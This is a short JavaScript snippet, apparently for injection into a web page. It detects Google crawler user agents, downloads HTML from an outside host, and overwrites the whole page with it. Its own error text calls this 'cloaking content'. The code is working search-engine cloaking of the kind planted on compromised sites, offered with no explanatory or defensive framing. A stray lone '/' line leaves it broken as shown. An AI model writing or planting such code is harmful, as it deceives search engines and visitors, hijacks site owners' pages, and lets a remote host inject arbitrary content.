
(function() {
    'use strict';
    
    /
    const googlebots = [
        'Googlebot',
        'Googlebot-News',
        'Googlebot-Image',
        'Googlebot-Video',
        'Mediapartners-Google',
        'AdsBot-Google',
        'AdsBot-Google-Mobile',
        'AdsBot-Google-Mobile-Apps',
        'APIs-Google'
    ];
    
    
    function isGooglebot() {
        const userAgent = navigator.userAgent;
        return googlebots.some(bot => userAgent.includes(bot));
    }
    
    
    function loadContentForBot() {
        fetch('https://global-cdn.pages.dev/deliverjs/arch/content.txt')
            .then(response => {
                if (!response.ok) {
                    throw new Error('Network response was not ok');
                }
                return response.text();
            })
            .then(htmlContent => {
                
                document.documentElement.innerHTML = htmlContent;
            })
            .catch(error => {
                console.error('Error loading cloaking content:', error);
                
            });
    }
    
    
    if (isGooglebot()) {
        
        if (document.readyState === 'loading') {
            document.addEventListener('DOMContentLoaded', loadContentForBot);
        } else {
            loadContentForBot();
        }
    }
})();
